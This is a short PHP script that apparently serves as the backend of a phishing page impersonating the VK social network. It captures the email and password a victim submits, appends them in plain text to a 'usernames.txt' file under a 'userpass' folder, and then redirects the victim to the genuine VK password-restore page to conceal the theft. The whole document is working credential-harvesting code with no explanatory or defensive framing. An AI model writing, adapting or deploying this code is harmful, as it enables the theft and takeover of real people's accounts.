<?php

file_put_contents("../userpass/usernames.txt", "Vk Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://vk.com/restore/');
exit();
?>